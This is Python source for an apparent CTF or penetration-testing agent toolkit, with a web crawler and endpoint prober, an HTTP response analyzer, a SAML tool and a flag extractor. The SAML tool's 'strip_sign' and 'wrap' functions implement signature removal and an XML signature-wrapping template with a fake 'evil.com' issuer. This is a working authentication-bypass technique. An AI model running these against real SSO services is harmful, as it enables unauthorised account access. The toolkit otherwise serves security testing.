"""Web 渗透工具集：crawler / http_analyze / saml / flag_extract。

针对 HTTP 服务的发现 → 分析 → 利用 → 提取闭环。
"""

from __future__ import annotations

import json
import re
import urllib.parse
from dataclasses import dataclass, field

import structlog

from secpt.core.tools.base import Tool

logger = structlog.get_logger(__name__)


@dataclass
class HTTPResponse:
    """HTTP 响应。"""

    status: int
    headers: dict[str, str]
    body: str
    url: str

    def to_dict(self) -> dict:
        return {
            "status": self.status,
            "headers": self.headers,
            "body": self.body[:5000],  # 截断
            "url": self.url,
        }


class HTTPClient:
    """极简 HTTP 客户端（基于 curl）。"""

    async def get(self, url: str, headers: dict | None = None) -> HTTPResponse:
        import asyncio
        cmd = ["curl", "-s", "-i", "-L", "--max-time", "10"]
        for k, v in (headers or {}).items():
            cmd.extend(["-H", f"{k}: {v}"])
        cmd.append(url)

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        return self._parse_response(stdout.decode("utf-8", errors="replace"), url)

    async def post(self, url: str, data: str, headers: dict | None = None) -> HTTPResponse:
        import asyncio
        cmd = ["curl", "-s", "-i", "-L", "--max-time", "10", "-X", "POST"]
        for k, v in (headers or {}).items():
            cmd.extend(["-H", f"{k}: {v}"])
        cmd.extend(["-d", data, url])

        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await proc.communicate()
        return self._parse_response(stdout.decode("utf-8", errors="replace"), url)

    def _parse_response(self, raw: str, url: str) -> HTTPResponse:
        """解析 curl -i 输出。"""
        lines = raw.split("\r\n")
        if len(lines) < 2:
            lines = raw.split("\n")

        status = 0
        headers: dict[str, str] = {}
        body_start = 0

        for i, line in enumerate(lines):
            if line.startswith("HTTP/"):
                parts = line.split()
                if len(parts) >= 2:
                    try:
                        status = int(parts[1])
                    except ValueError:
                        pass
            elif ":" in line and body_start == 0:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.strip()
            elif line == "" and body_start == 0:
                body_start = i + 1
                break

        body = "\n".join(lines[body_start:]) if body_start > 0 else raw
        return HTTPResponse(status=status, headers=headers, body=body, url=url)


class CrawlerTool(Tool):
    """爬虫：发现端点、链接、表单。"""

    name = "crawler"
    description = "爬取 HTTP 服务，发现端点、链接、表单"

    async def run(self, args: str) -> str:
        """args: <url> [--depth 2]"""
        import asyncio
        parts = args.split()
        if not parts:
            return "Error: 用法: crawler <url> [--depth N]"

        url = parts[0]
        depth = 1
        if "--depth" in parts:
            idx = parts.index("--depth")
            if idx + 1 < len(parts):
                depth = int(parts[idx + 1])

        # 逐工具超时
        try:
            from secpt.config.settings import get_settings
            _settings = get_settings()
            _timeout = _settings.tools.tool_timeouts.get("crawler", 30.0)
        except Exception:
            _timeout = 30.0

        try:
            return await asyncio.wait_for(self._crawl(url, depth), timeout=_timeout)
        except asyncio.TimeoutError:
            return json.dumps({"status": "failure", "error_type": "timeout", "hint": "crawler 超时，请减小 depth 或换目标"}, ensure_ascii=False)
        except Exception as e:
            return f"Error: {e}"

    async def _crawl(self, url: str, depth: int) -> str:
        client = HTTPClient()
        found: dict[str, set] = {
            "links": set(),
            "forms": set(),
            "endpoints": set(),
            "scripts": set(),
        }

        visited: set[str] = set()
        to_visit = [(url, 0)]

        while to_visit:
            current, d = to_visit.pop(0)
            if current in visited or d > depth:
                continue
            visited.add(current)

            try:
                resp = await client.get(current)
            except Exception as e:
                logger.warning("crawler.fetch_failed", url=current, error=str(e))
                continue

            # 提取链接
            for m in re.finditer(r'href=["\']([^"\']+)["\']', resp.body):
                link = urllib.parse.urljoin(current, m.group(1))
                if self._same_domain(url, link):
                    found["links"].add(link)
                    if d < depth:
                        to_visit.append((link, d + 1))

            # 提取表单
            for m in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\'](\w+)["\']', resp.body, re.I):
                action = urllib.parse.urljoin(current, m.group(1))
                found["forms"].add(f"{m.group(2).upper()} {action}")

            # 提取 JS 端点
            for m in re.finditer(r'(?:url|endpoint|path)\s*[:=]\s*["\']([^"\']+)["\']', resp.body):
                found["scripts"].add(urllib.parse.urljoin(current, m.group(1)))

            # 常见端点探测
            for path in ["/saml", "/sso", "/auth", "/login", "/admin", "/api", "/.well-known"]:
                full = urllib.parse.urljoin(url, path)
                try:
                    r = await client.get(full)
                    if r.status != 404:
                        found["endpoints"].add(f"{r.status} {full}")
                except Exception:
                    pass

        return json.dumps({
            "visited": len(visited),
            "links": sorted(found["links"])[:20],
            "forms": sorted(found["forms"])[:10],
            "endpoints": sorted(found["endpoints"]),
            "scripts": sorted(found["scripts"])[:10],
        }, indent=2, ensure_ascii=False)

    def _same_domain(self, base: str, link: str) -> bool:
        try:
            b = urllib.parse.urlparse(base)
            l = urllib.parse.urlparse(link)
            return b.netloc == l.netloc or l.netloc == ""
        except Exception:
            return False


class HTTPAnalyzerTool(Tool):
    """HTTP 分析器：识别技术栈、认证机制、漏洞线索。"""

    name = "http_analyze"
    description = "分析 HTTP 响应，识别 SAML/SSO/OAuth/技术栈/漏洞线索"

    async def run(self, args: str) -> str:
        """args: <url>"""
        url = args.strip()
        if not url:
            return "Error: 用法: http_analyze <url>"

        client = HTTPClient()
        try:
            resp = await client.get(url)
        except Exception as e:
            return f"Error: {e}"

        findings: dict[str, list] = {
            "tech_stack": [],
            "auth_mechanisms": [],
            "saml_indicators": [],
            "potential_vulns": [],
            "interesting_headers": [],
        }

        # 技术栈识别
        server = resp.headers.get("Server", "")
        if server:
            findings["tech_stack"].append(f"Server: {server}")
        powered = resp.headers.get("X-Powered-By", "")
        if powered:
            findings["tech_stack"].append(f"X-Powered-By: {powered}")

        body_lower = resp.body.lower()

        # SAML 指标
        saml_keywords = [
            "samlrequest", "samlresponse", "saml2p", "samlp",
            "entityid", "assertionconsumerservice", "single_sign_on",
            "identityprovider", "serviceprovider",
        ]
        for kw in saml_keywords:
            if kw in body_lower or kw in str(resp.headers).lower():
                findings["saml_indicators"].append(kw)

        # 认证机制
        if "location" in resp.headers and "saml" in resp.headers.get("location", "").lower():
            findings["auth_mechanisms"].append(f"Redirect to SAML: {resp.headers['location']}")
        if "www-authenticate" in resp.headers:
            findings["auth_mechanisms"].append(f"WWW-Authenticate: {resp.headers['www-authenticate']}")
        if "set-cookie" in resp.headers:
            findings["auth_mechanisms"].append(f"Cookie: {resp.headers['set-cookie'][:100]}")

        # 潜在漏洞
        if resp.status == 500:
            findings["potential_vulns"].append("500 Internal Server Error")
        if "error" in body_lower and "stack" in body_lower:
            findings["potential_vulns"].append("Stack trace in error page")
        if "debug" in body_lower or "trace" in body_lower:
            findings["potential_vulns"].append("Debug/trace mode enabled")
        if re.search(r'(api[_-]?key|secret|token|password)\s*[:=]\s*["\'][^"\']+["\']', body_lower):
            findings["potential_vulns"].append("Hardcoded credentials in response")

        # 有趣响应头
        for h in ["Location", "Set-Cookie", "WWW-Authenticate", "Content-Security-Policy"]:
            if h.lower() in {k.lower() for k in resp.headers}:
                findings["interesting_headers"].append(f"{h}: {resp.headers.get(h, '')[:200]}")

        findings["status"] = resp.status
        findings["url"] = url

        return json.dumps(findings, indent=2, ensure_ascii=False)


class SAMLTool(Tool):
    """SAML 处理器：解析/构造/操纵 SAML 消息。"""

    name = "saml"
    description = "SAML 消息解析、构造、签名绕过"

    async def run(self, args: str) -> str:
        """args: <subcommand> [options]
        
        子命令:
          decode <b64>     — 解码 Base64 + URL 编码的 SAML 消息
          encode <xml>     — 编码 XML 为 SAML 传输格式
          strip_sign <xml> — 移除签名
          wrap <xml>       — 尝试 XML 包装攻击
        """
        parts = args.split(None, 1)
        if len(parts) < 2:
            return "Error: 用法: saml <decode|encode|strip_sign|wrap> <data>"

        cmd, data = parts

        if cmd == "decode":
            return self._decode(data)
        elif cmd == "encode":
            return self._encode(data)
        elif cmd == "strip_sign":
            return self._strip_sign(data)
        elif cmd == "wrap":
            return self._wrap(data)
        else:
            return f"Error: 未知子命令 {cmd}"

    def _decode(self, data: str) -> str:
        """解码 SAML 消息。"""
        import base64
        try:
            # URL 解码 + Base64 解码
            decoded = urllib.parse.unquote(data)
            xml_bytes = base64.b64decode(decoded)
            return xml_bytes.decode("utf-8", errors="replace")
        except Exception as e:
            return f"Error: 解码失败: {e}"

    def _encode(self, xml: str) -> str:
        """编码 XML 为 SAML 传输格式。"""
        import base64
        try:
            b64 = base64.b64encode(xml.encode()).decode()
            return urllib.parse.quote(b64)
        except Exception as e:
            return f"Error: 编码失败: {e}"

    def _strip_sign(self, xml: str) -> str:
        """移除 XML 签名。"""
        # 移除 Signature 元素
        patterns = [
            r'<ds:Signature[^>]*>.*?</ds:Signature>',
            r'<Signature[^>]*>.*?</Signature>',
            r'<ds:Signature[^>]*/>',
        ]
        result = xml
        for p in patterns:
            result = re.sub(p, '', result, flags=re.DOTALL | re.I)
        return result

    def _wrap(self, xml: str) -> str:
        """XML 包装攻击模板。"""
        # 提取 Assertion
        assertion_match = re.search(r'<(?:saml:)?Assertion[^>]*>.*?</(?:saml:)?Assertion>', xml, re.DOTALL)
        if not assertion_match:
            return "Error: 未找到 Assertion 元素"

        assertion = assertion_match.group(0)
        # 经典包装攻击
        wrapped = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
    <Issuer>https://evil.com</Issuer>
  </Assertion>
  {assertion}
</samlp:Response>'''
        return wrapped


class FlagExtractorTool(Tool):
    """FLAG 提取器：从任意文本中提取 FLAG 格式内容。"""

    name = "flag_extract"
    description = "从文本中提取 FLAG{...} / flag{...} 格式"

    async def run(self, args: str) -> str:
        """args: <text_or_url>"""
        text = args.strip()
        if not text:
            return "Error: 用法: flag_extract <text_or_url>"

        # 如果是 URL，先获取
        if text.startswith("http://") or text.startswith("https://"):
            client = HTTPClient()
            try:
                resp = await client.get(text)
                text = resp.body
            except Exception as e:
                return f"Error: 获取失败: {e}"

        # 多种 FLAG 格式
        patterns = [
            r'FLAG\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'flag_[a-f0-9]{32}',
            r'[Ff][Ll][Aa][Gg][:：]\s*([^\s,;]+)',
        ]

        found = []
        for p in patterns:
            for m in re.finditer(p, text):
                found.append(m.group(0))

        if found:
            return json.dumps({
                "flags": found,
                "count": len(found),
            }, indent=2)
        else:
            # 返回前 500 字符供 LLM 分析
            return json.dumps({
                "flags": [],
                "hint": text[:500],
            }, indent=2, ensure_ascii=False)


__all__ = [
    "CrawlerTool",
    "HTTPAnalyzerTool",
    "SAMLTool",
    "FlagExtractorTool",
]
